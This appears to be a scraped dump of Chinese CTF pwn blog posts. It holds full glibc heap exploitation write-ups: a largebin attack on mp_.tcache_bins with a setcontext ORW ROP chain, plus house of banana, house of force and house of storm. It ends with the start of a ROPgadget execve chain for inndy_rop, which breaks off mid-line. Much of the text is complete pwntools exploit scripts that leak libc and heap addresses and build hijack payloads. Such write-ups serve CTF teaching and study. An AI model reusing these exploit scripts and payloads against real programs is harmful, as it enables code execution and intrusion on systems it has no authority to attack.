大小限制在0x500-0x900\ndelete函数没有置零堆块指针 存在UAF\nshow函数可以打印堆块内容 \nedit函数不存在堆溢出 根据最开始申请chunk时输入的size\n由于对申请chunk的限制 一开始我们能考虑的只有unsortedbin attack 和 largebin attack\n但是前者相对鸡肋 需要我们对任意申请地址已经有edit能力 后者也只能做到任意地址写堆地址\nhouse of storm需要最后申请的chunk大小符合0x50链表 所以也没有办法\n那么我们需要另寻出路 覆盖mp_.tcache_bins来使得size较大的chunk也能被释放到tcachebin中 从而可以打tcachebin attack 任意地址写\n这里采用largebin attack任意写的那一套\n我们先泄露基址 注意一下末尾00 需要覆盖一下 否则puts无法泄露\nadd(0,0x800)add(1,0x900)add(2,0x7f0)delete(0)edit(0,b&#x27;\\x01&#x27;)show(0)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1-96libc_addr = main_arena_addr - (libc.sym[&#x27;__malloc_hook&#x27;]+0x10)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]edit(0,b&#x27;\\x00&#x27;)\n\n顺便把chunk0释放到largebin后 泄露一下堆地址 因为这个版本已经有了fd异或保护机制\nadd(3,0x900)edit(0,cyclic(0x10))show(0)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x290success(&quot;heap_addr :&quot;+hex(heap_addr))\n\nmp_tcache_bins = libc_addr + 0x1e32d0success(&quot;mp_tcache_bins :&quot;+hex(mp_tcache_bins))payload = p64(0)+p64(mp_tcache_bins-0x10)+p64(0)+p64(mp_tcache_bins-0x20)edit(0,payload)delete(2)add(4,0x900)\n\n然后就是largebin attack的部分 此时mp_tcache_bins处已经被写入一个很大的值 小于这个值的都会被释放进tcachebin\n\nadd(5,0x900)add(6,0x900)add(7,0x900)delete(5)delete(6)key = ( heap_addr + 0x3000 ) &gt;&gt;12success(&quot;key :&quot;+hex(key))edit(6,p64(key^(free_hook)))add(8,0x900)add(9,0x900)\n\n接下来利用tcache 申请到free_hook的空间\n接下来就是重头戏了 由于开启了沙盒 所以我们只能用orw来泄露flag\n2.29以前 setcontext是通过rdi寄存器来寻址 相对来说很好控制 但是2.32是由rdx来寻址 我们需要想办法控制rdx寄存器的值\n.text:000000000005306D                 mov     rsp, [rdx+0A0h].text:0000000000053074                 mov     rbx, [rdx+80h].text:000000000005307B                 mov     rbp, [rdx+78h].text:000000000005307F                 mov     r12, [rdx+48h].text:0000000000053083                 mov     r13, [rdx+50h].text:0000000000053087                 mov     r14, [rdx+58h].text:000000000005308B                 mov     r15, [rdx+60h].text:000000000005308F                 test    dword ptr fs:48h, 2.text:000000000005309B                 jz      loc_53156.text:0000000000053156 loc_53156:                              ; CODE XREF: .text:0000000000053156                 mov     rcx, [rdx+0A8h].text:000000000005315D                 push    rcx.text:000000000005315E                 mov     rsi, [rdx+70h].text:0000000000053162                 mov     rdi, [rdx+68h].text:0000000000053166                 mov     rcx, [rdx+98h].text:000000000005316D                 mov     r8, [rdx+28h].text:0000000000053171                 mov     r9, [rdx+30h].text:0000000000053175                 mov     rdx, [rdx+88h]\n\n利用ropper工具 可以搜索libc文件中的gadget 看看有没有能达到我们目的的\n\n其中 我们找到了符合我们要求的 可以通过rdi的值来影响到rdx\n\n如果调用free函数 那么rdi寄存器存的就是我们想要释放的堆块的用户地址 并且利用call指令 还可以进行下一步跳转 也就是跳转到setcontext上\nret_addr = libc_addr + 0x26699rdi_addr = libc_addr + 0x2858frsi_addr = libc_addr + 0x2ac3frdx_r12_addr = libc_addr + 0x114161rax_addr = libc_addr + 0x45580setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61gadget_addr = libc_addr + 0x000000000014b760chunk8_addr = heap_addr +0x36e0open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]success(hex(chunk8_addr))flag_addr = chunk8_addr + 0x10payload = b&#x27;./flag\\x00\\x00&#x27;+p64(chunk8_addr+0x10)+cyclic(0x10)+p64(setcontext_addr)\n\nchunk8_addr是包括了chunk头的首地址\n这里主要来详细讲一下payload的构造 flag字符串是为了接下来的orw\n第一条指令\nmov rdx, qword ptr [rdi + 8]\n\n此时rdi指向的是chunk8_addr+0x10的地址 再加8 也就是指向了chunk8_addr+0x18\n取这个地址的值赋值给rdx 也就是在flag字符串后我们要存入想要控制的rdx值 这里选择是chunk8_addr+0x10 \n在接下来的setcontext rsp指针就会被赋值到chunk8_addr+0xb0 我们只要在那里进行下一步的构造即可\n第二条指令没啥用 不用关注 看第三条\ncall qword ptr [rdx + 0x20]\n\n此时的rdx对应的值为chunk8_addr+0x18 也就是说 setcontext的地址要被放到chunk8_addr+0x38处\n随后 我们用垃圾数据填充 来到chunk8_addr + 0xb0处继续开始构造\npayload = b&#x27;./flag\\x00\\x00&#x27;+p64(chunk8_addr+0x10)+cyclic(0x10)+p64(setcontext_addr)payload = payload.ljust(0xa0,b&#x27;\\x00&#x27;) + p64(chunk8_addr+0x10+0xa8)+p64(ret_addr)payload += p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(0x50) + p64(0) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(0x50) + p64(0) + p64(write_addr)\n\n\n此时rcx的值是我们存入的ret指令 并且执行完push后 栈上会存放两个ret\n\n接下来一直执行到setcontext的ret指令的时候 就会将栈上的ret弹入到rip寄存器中 顺延执行到pop rdi\n我们就成功控制了程序执行流 成功获取flag\n完整exp:\nfrom pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28793)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()def add(index,size):    io.recvuntil(&quot;5. Exit&quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))def delete(index):    io.recvuntil(&quot;5. Exit&quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def edit(index,content):    io.recvuntil(&quot;5. Exit&quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Content: &quot;)    io.send(content)def show(index):    io.recvuntil(&quot;5. Exit&quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))add(0,0x800)add(1,0x900)add(2,0x7f0)delete(0)edit(0,b&#x27;\\x01&#x27;)show(0)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1-96libc_addr = main_arena_addr - (libc.sym[&#x27;__malloc_hook&#x27;]+0x10)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]edit(0,b&#x27;\\x00&#x27;)add(3,0x900)edit(0,cyclic(0x10))show(0)heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x290success(&quot;heap_addr :&quot;+hex(heap_addr))mp_tcache_bins = libc_addr + 0x1e32d0success(&quot;mp_tcache_bins :&quot;+hex(mp_tcache_bins))payload = p64(0)+p64(mp_tcache_bins-0x10)+p64(0)+p64(mp_tcache_bins-0x20)edit(0,payload)delete(2)add(4,0x900)add(5,0x900)add(6,0x900)add(7,0x900)delete(5)delete(6)key = ( heap_addr + 0x3000 ) &gt;&gt;12success(&quot;key :&quot;+hex(key))edit(6,p64(key^(free_hook)))add(8,0x900)add(9,0x900)# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]ret_addr = libc_addr + 0x26699rdi_addr = libc_addr + 0x2858frsi_addr = libc_addr + 0x2ac3frdx_r12_addr = libc_addr + 0x114161rax_addr = libc_addr + 0x45580setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61gadget_addr = libc_addr + 0x000000000014b760chunk8_addr = heap_addr +0x36e0open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]success(hex(chunk8_addr))flag_addr = chunk8_addr + 0x10payload = b&#x27;./flag\\x00\\x00&#x27;+p64(chunk8_addr+0x10)+cyclic(0x10)+p64(setcontext_addr)payload = payload.ljust(0xa0,b&#x27;\\x00&#x27;) + p64(chunk8_addr+0x10+0xa8)+p64(ret_addr)payload += p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(0x50) + p64(0) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_r12_addr) + p64(0x50) + p64(0) + p64(write_addr)edit(8,payload)edit(9,p64(gadget_addr))# gdb.attach(io,&#x27;b *&#x27;+str(gadget_addr))# pause(0)delete(8)io.recv()\n\n","categories":["wp"]},{"title":"house of banana","url":"/2023/03/24/house-of-banana/","content":"前言功能十分强大的一个house of 系列 可以执行onegadget或者是system(“&#x2F;bin&#x2F;sh”)来获取shell原理是通过largebinattack把chunk_addr覆盖程序执行exit时所需要的结构体 进行伪造 这样就可以劫持exit函数\n源码分析我们在之前的栈部分学习中 学过篡改fini_array 来进行一个重复执行main函数\n但是其利用需要关闭RELRO保护 然而堆题基本都是保护全开 所以很少用到 今天来学习一下伪造fini_array赋值用到的结构体 从而控制程序exit时的程序执行流\n\n利用源码调试 可以知道 fini_array是在&#x2F;elf&#x2F;dl-fini.c的139行被调用的  那么我们跟进一下源码 看一下赋值逻辑\n    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)&#123;    ElfW(Addr) *array =    (ElfW(Addr) *) (l-&gt;l_addr            + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);    unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val            / sizeof (ElfW(Addr)));    while (i-- &gt; 0)    ((fini_t) array[i]) ();&#125;`\n\narray &#x3D; (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr)\n貌似和l这个链表有关 朔源一下l的定义\nstruct link_map *l &#x3D; maps[i]\n继续朔源一下maps数组的赋值\ndefine GL(name) _rtld_global._##namefor (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)/* Do not handle ld.so in secondary namespaces.  */if (l == l-&gt;l_real)    &#123;assert (i &lt; nloaded);maps[i] = l;l-&gt;l_idx = i;++i;/* Bump l_direct_opencount of all objects so that they    are not dlclose()ed from underneath us.  */++l-&gt;l_direct_opencount;    &#125;\n\nmaps的赋值和GL(dl_ns)[ns]._ns_loaded这个结构体有关系 所以我们只需要伪造该结构体 就能操控maps的值 从而操控\nfini_array的内容\n每一次for循环后l的赋值可以看出来其是一个链表 看其他师傅的介绍是必须有四个元素 也就有两种做法 截取第一个节点开始伪造 或者是从第三个节点开始伪造 前者伪造的更加麻烦 这里先来介绍后者的\n劫持第三个节点首先需要获得第三个节点的位置 采用计算和_rtld_global结构体的偏移来得到\ndistance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)\n\n接着为了进入if分支 我们还需要通过第一个判断\nl == l-&gt;l_real\n\n也就是在fake+0x28处需要写入fake地址\nstruct link_map *l = maps[i];\t      if (l-&gt;l_init_called)\t\t&#123;\t\t  /* Make sure nothing happens if we are called twice.  */\t\t  l-&gt;l_init_called = 0;\t\t  /* Is there a destructor function?  */\t\t  if (l-&gt;l_info[DT_FINI_ARRAY] != NULL\t\t      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != NULL))\t\t    &#123;\t\t      /* When debugging print a message first.  */\t\t      if (__builtin_expect (GLRO(dl_debug_mask)\t\t\t\t\t    &amp; DL_DEBUG_IMPCALLS, 0))\t\t\t_dl_debug_printf (&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;,\t\t\t\t\t  DSO_FILENAME (l-&gt;l_name),\t\t\t\t\t  ns);\n\nfor循环中还有这样一段 为了使for循环顺利执行 我们同样需要绕过这里的if判断\n需要绕过l-&gt;l_init_called 不过这里貌似不能是个1就行 需要伪造成其原本的值 和上面的一样 查一下偏移和所需要的值\ndistance _rtld_global._dl_ns[0]._ns_loaded  &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_calledx/wx &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called \n\n第二个if用的是或 通过一个就行了 这里选第一个 可以一并绕过下一个if \nl-&gt;l_info[DT_FINI_ARRAY] !&#x3D; NULL\n同时注意一下下面maps赋值的操作 \nElfW(Addr) *array = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);\n\nfini_array的值由l-&gt;l_info[DT_FINI_ARRAY]决定\n我们还需要控制i的值 i由下面这个式子得到\ni = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / sizeof (ElfW(Addr)))\n\ndistance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[28])\n\n这里的i跟随着系统原本的布局\n\n并且你会发现 i的值应该是存放在对应偏移地址的下一个字长处\n\n同理可得 我们还需要关注一下l-&gt;l_info[DT_FINI_ARRAY]需要怎么构造\n\n同样是需要把地址放在下一个字长处 并且需要经过两次跳转\n总结一下就是按照下面这样构造 这里的偏移因人而异 我把所有的偏移都减去了0x10 是因为fake是从chunk头开始算的 而edit是从chunk的用户空间开始\npayload = p64(0)*3 + p64(fake_addr)payload = payload.ljust(0x38,b&#x27;\\x00&#x27;)+p64(fake_addr+0x58)+p64(8)+p64(onegadget_addr)payload = payload.ljust(0x100,b&#x27;\\x00&#x27;)+p64(fake_addr+0x40)payload = payload.ljust(0x110,b&#x27;\\x00&#x27;)+p64(fake_addr+0x48)payload = payload.ljust(0x31c-0x10,b&#x27;\\x00&#x27;)+p64(0x1c)\n\n更加详细的流程可以看这位师傅的博客 我只是做个总结\nhouse_of_banana源码分析 | Blog of cat03 (giles-one.github.io)\n","categories":["堆"]},{"title":"house of force","url":"/2023/02/03/house-of-force/","content":"一种修改top chunk的地址来获取低地址处内存空间的chunk的办法\n复习一下chunk的申请办法 是先判断bin中是否有符合大小的chunk 如果没有再去top chunk分配\ntop chunk的分配办法是在top chunk顶部分配出一个空间 随后top chunk的位置向高地址处增加\n这一过程我们来看一下源码是如何实现的\nvictim = av-&gt;top;//获取当前top chunk的地址size = chunksize (victim);//获取当前top chunk的大小if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))//MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20//nb为实际要获取的chunk大小(申请的大小加上MINSIZE)//判断式是为了保证top chunk有足够大小的空间来供此次申请//之所以要加上MINSIZE是因为为了确保申请完chunk后 top chunk还能保持完整的chunk结构  &#123;    remainder_size = size - nb;//remainder_size为分配chunk后的top chunk大小    remainder = chunk_at_offset (victim, nb);//remainder为分配完后的top chunk地址    av-&gt;top = remainder;//更新top chunk    //下面两个set_head给分配出去的堆块以及分配后的top chunk设置新的size    set_head (victim, nb | PREV_INUSE |              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head (remainder, remainder_size | PREV_INUSE);    check_malloced_chunk (av, victim, nb);//无关 忽略    void *p = chunk2mem (victim);//无关 忽略    alloc_perturb (p, bytes);    return p;  &#125;\n\n首先我们需要绕过   size &gt;&#x3D;  nb + MINSIZE   这个判断式 使其结果为True 才能进入if分支\n我们在进行house of force漏洞利用的时候 nb通常都是负数(下面会讲 这里先知道个大概就行) 而你也可以在源码中看到 nb在计算时是被当作一个无符号正数看待的 也就是说计算机遇到负数nb时会将其转化成补码(我在计组原理的文章中有提及)这会使得nb成为一个很庞大的数\n所以我们需要让top chunk的size也作为一个负数 并且这个负数的补码要是所有负数中最大的(或者大于nb即可)\n所以这里通过堆溢出覆盖top chunk的size为0xffffffffffffffff 也就是-1即可\n接着就是if分支中设置top chunk新的地址的算式\nremainder &#x3D; chunk_at_offset (victim, nb) 相当于  victim+nb&#x3D;top_chunk\n原本的top chunk地址加上实际上要分配的大小等于新的top chunk地址\n而nb &#x3D; request_size + MINSIZE   top_chunk &#x3D; request_addr - MINSIZE\n所以request_size &#x3D; request_addr - oldtopchunk_addr - 2*MINSIZE\n接下来我们用一道例题加深一下理解\nhitcontraining_bambooboxchecksec看一下保护机制\n[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\nida看一下伪代码\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  void (**v4)(void); // [rsp+8h] [rbp-18h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v6; // [rsp+18h] [rbp-8h]  v6 = __readfsqword(0x28u);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  v4 = malloc(0x10uLL);  *v4 = hello_message;  v4[1] = goodbye_message;  (*v4)();  while ( 1 )  &#123;    menu();    read(0, buf, 8uLL);    switch ( atoi(buf) )    &#123;      case 1:        show_item();        break;      case 2:        add_item();        break;      case 3:        change_item();        break;      case 4:        remove_item();        break;      case 5:        v4[1]();        exit(0);      default:        puts(&quot;invaild choice!!!&quot;);        break;    &#125;  &#125;&#125;\n\n常规的菜单题 给了输出chunk内容的机会 释放chunk的时候一同置零了指针 不存在UAF漏洞\n具体来看一下main函数开头的几行代码\nv4 = malloc(0x10uLL);*v4 = hello_message;v4[1] = goodbye_message;(*v4)();\n\n申请了0x10大小的chunk 依次存放了hello_message的地址和goodbye_message的地址\n并且先执行了hello_message\nint hello_message()&#123;  puts(&quot;There is a box with magic&quot;);  return puts(&quot;what do you want to do in the box&quot;);&#125;\n\n而goodbye_message在我们选择退出程序后的分支执行\nint goodbye_message()&#123;  puts(&quot;See you next time&quot;);  return puts(&quot;Thanks you&quot;);&#125;\n\n并且程序还给了一个magic函数 可以直接输出flag信息\nvoid __noreturn magic()&#123;  int fd; // [rsp+Ch] [rbp-74h]  char buf[104]; // [rsp+10h] [rbp-70h] BYREF  unsigned __int64 v2; // [rsp+78h] [rbp-8h]  v2 = __readfsqword(0x28u);  fd = open(&quot;/home/bamboobox/flag&quot;, 0);  read(fd, buf, 0x64uLL);  close(fd);  printf(&quot;%s&quot;, buf);  exit(0);&#125;\n\n所以思路就是覆盖v4这个chunk中的goodbye_message 使其为magic函数地址\n为了重复申请到v4这个chunk 就需要我们调整top chunk的地址 使其为v4 chunk的地址 这样再次申请一个chunk就达成目的\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size,name):    io.recvuntil(&quot;Your choice:&quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;Please enter the length of item name:&quot;)    io.sendline(str(size))    io.recvuntil(&quot;Please enter the name of item:&quot;)    io.send(name)def delete(index):    io.recvuntil(&quot;Your choice:&quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;Please enter the index of item:&quot;)    io.sendline(str(index))    io.recvuntil(&quot;remove successful!!&quot;)def edit(index,size,name):    io.recvuntil(&quot;Your choice:&quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Please enter the index of item:&quot;)    io.sendline(str(index))    io.recvuntil(&quot;Please enter the length of item name:&quot;)    io.sendline(str(size))    io.recvuntil(&quot;Please enter the new name of the item:&quot;)    io.send(name)def show():    io.recvuntil(&quot;Your choice:&quot;)    io.sendline(b&#x27;1&#x27;)add(0x30,b&#x27;aaaa&#x27;)payload = cyclic(0x38)+p64(0xffffffffffffffff)edit(0,len(payload),payload)magic_addr = 0x400d49payload = cyclic(0x8)+p64(magic_addr)add(-0x70,b&#x27;aaaa&#x27;)\n\n此时我们看一下chunk布局\n\n可以看到top chunk已经调整到了原先v4chunk的位置 我们再次申请一个chunk 看看\nadd(0x10,b&#x27;aaaaaaaa&#x27;*2)\n\n\n可以看到成功覆盖\n那么我们把垃圾数据换成magic函数的地址\n就可以实现flag的泄露(不过你打buu远程不能用这种办法 他docker没还原环境)\n完整exp:\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size,name):    io.recvuntil(&quot;Your choice:&quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;Please enter the length of item name:&quot;)    io.sendline(str(size))    io.recvuntil(&quot;Please enter the name of item:&quot;)    io.send(name)def delete(index):    io.recvuntil(&quot;Your choice:&quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;Please enter the index of item:&quot;)    io.sendline(str(index))    io.recvuntil(&quot;remove successful!!&quot;)def edit(index,size,name):    io.recvuntil(&quot;Your choice:&quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Please enter the index of item:&quot;)    io.sendline(str(index))    io.recvuntil(&quot;Please enter the length of item name:&quot;)    io.sendline(str(size))    io.recvuntil(&quot;Please enter the new name of the item:&quot;)    io.send(name)def show():    io.recvuntil(&quot;Your choice:&quot;)    io.sendline(b&#x27;1&#x27;)add(0x30,b&#x27;aaaa&#x27;)payload = cyclic(0x38)+p64(0xffffffffffffffff)edit(0,len(payload),payload)magic_addr = 0x400d49payload = cyclic(0x8)+p64(magic_addr)add(-0x70,b&#x27;aaaa&#x27;)add(0x10,payload)io.recvuntil(&quot;Your choice:&quot;)io.sendline(b&#x27;5&#x27;)io.recv()\n\n\n总结一下 house of force适用于\n有堆溢出 没有对申请chunk的大小做过多限制 可以获取top chunk地址低地址处的任意写的机会\n","categories":["堆"]},{"title":"house of storm","url":"/2023/03/13/house-of-storm/","content":"前言一种结合了unsortedbin attack和largebin attack的攻击办法 可以达到任意地址写的效果\n在学习这两个漏洞的时候 其各自效能不大 unsortedbin 受限于对于fake chunk的size域和bk域的检查\nlargebin attack受限于其只能单一的在任意地址写堆地址\n但是如果将二者结合起来 就可以达到任意地址申请chunk的效果\n不过这个办法也是旧时代的眼泪了 在libc2.30以后就诞生了新的检查机制来防止\n源码分析首先我们要清楚整个漏洞的触发流程 先是利用unsortedbin chunk放入到largebin chunk中 从而将fake chunk链入unsorted_chunks (av)\n/* remove from unsorted list */   unsorted_chunks (av)-&gt;bk = bck;  // 把 fake_chunk 链入 unsorted_chunks(av)   bck-&gt;fd = unsorted_chunks (av);  // 把 fake_chunk 的 fd 改成 unsorted_chunks (av)\n\n同时还可以将fake chunk的fd域修改为unsorted_chunks (av)\n为了达到这一目的 我们就需要更改unsortedbin chunk的bk域为fakechunk_addr - 0x10\n这里之所以还要减去0x10 是为了腾出size域和prev_size域的空间\n紧接着我们需要利用largebin attack来写fake chunk的size域 以及完善fake chunk的结构 以供绕过双向链表的检测\n                      else                        &#123;                          victim-&gt;fd_nextsize = fwd; //unsortedbin的fd_nextsize域被设置为了largebin chunk的首地址                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; //unsortebin的bk_nextsize域被设置为largebin的bk_nextsize                          fwd-&gt;bk_nextsize = victim; //把largebin的bk_nextsize域设置为unsortedbin的首地址                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;//这里就是伪造size的关键句 将unsortedbin的bk_nextsize指向的地址+0x20处填入unsortedbin地址                        &#125;                      bck = fwd-&gt;bk;                    &#125;                &#125;              else                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;            &#125;          mark_bin (av, victim_index);          victim-&gt;bk = bck;  //把 unsorted bin 里刚放进的 chunk-&gt;bk 改为 large bin-&gt;bk          victim-&gt;fd = fwd;  //把 unsorted bin 里刚放进的 chunk-&gt;fd 改为 large bin          fwd-&gt;bk = victim;  //把 large bin 的 chunk-&gt;bk 改为 unsorted bin 里刚放进的 chunk 的首地址          bck-&gt;fd = victim;  //这里伪造了fake chunk的bk域 //bck = fwd-&gt;bk//bck-&gt;fd = (fwd-&gt;bk)+0x10\n\n实际利用为了配合上述的源代码 我们需要将两个chunk的布局构造成下面这样\nptr_addr = 你想要任意写的地址-0x10payload = p64(0)+p64(ptr_addr) #unsortedbinpayload = p64(0)+p64(ptr_addr+0x8)+p64(0)+p64(ptr_addr-0x18-5) #largebin\n\n具体的数值计算就自己根据源码来看了 应该挺好懂的  还有一点需要注意的就是unsoretbin chunk和largebin chunk的释放时机\nadd(0x418,b&#x27;aaaa&#x27;)#0add(0x18,b&#x27;aaaa&#x27;)#1add(0x408,b&#x27;aaaa&#x27;)#2  largebinadd(0x18,b&#x27;aaaa&#x27;)#3delete(2)delete(0)add(0x418,b&#x27;aaaa&#x27;)#4  unsortedbindelete(4)ptr_addr = 0xABCD0500-0x10payload = p64(0)+p64(ptr_addr)edit(4,len(payload),payload)payload = p64(0)+p64(ptr_addr+0x8)+p64(0)+p64(ptr_addr-0x18-5)edit(2,len(payload),payload)add(0x48,b&#x27;aaaa&#x27;)debug()\n\n你可以看到 要先释放largebin chunk 这是因为要将size小的放在链表头 不然后续无法将其放入largebin\n总体利用还是比较简单的 难在理解\n","categories":["堆"]},{"title":"inndy_rop","url":"/2022/11/24/inndy-rop/","content":"这一题以前没遇到过 算是蛮新奇的 所以记录下来 还学到了ROPgadget的新用法\n[*] &#x27;/home/chen/pwn&#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n\n32位 没有开启pie和canary\nida打开后发现只有一个简单的gets溢出的机会\nint overflow()&#123;  char v1[12]; // [esp+Ch] [ebp-Ch] BYREF  return gets(v1);&#125;\n\n并且这题是静态编译 ida打开会出现一大堆乱七八糟的函数 静态编译没有调用libc函数 所以这题也就不存在泄露libc然后获取system函数地址 进行系统调用的做法了\n那么这时候 就需要用到ROPgadget其一个功能 自动生成一串rop链\nROPgadget --binary file_name --ropchain\n\n# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # 